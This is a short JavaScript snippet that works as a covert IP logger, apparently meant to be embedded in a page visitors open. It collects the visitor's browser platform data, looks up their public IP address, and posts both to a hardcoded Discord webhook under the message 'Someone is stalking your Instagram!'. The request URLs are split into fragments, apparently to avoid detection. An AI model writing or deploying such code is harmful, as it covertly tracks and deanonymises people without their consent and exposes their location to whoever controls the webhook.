var userAgentData = JSON.stringify(platform, null, 4),
	ipData

var getEmbed = () => {
	return {
		color: 16566787,
		description: `Someone is stalking your Instagram! 😂 😳
      
      IP: ${ipData}
      
      User agents:
      \`\`\`${userAgentData}\`\`\``,
		timestamp: new Date(),
	}
}

fetch('https://ap' + 'i.i' + 'pify.org/?format=json')
	.then((data) => data.json())
	.then((json) => (ipData = json.ip))
	.then(() => {
		fetch(
			'https://discor' +
				'd.com/ap' +
				'i/webh' +
				'ooks/1038470262422781992/z20bmmoCl7oOBrjZkf_HtW-_GSNAuMk8_L5Nq6lLl5jN5tPIhoLYxUb9GfQLp4_e8ygQ',
			{
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ embeds: [getEmbed()] }),
			}
		)
	})
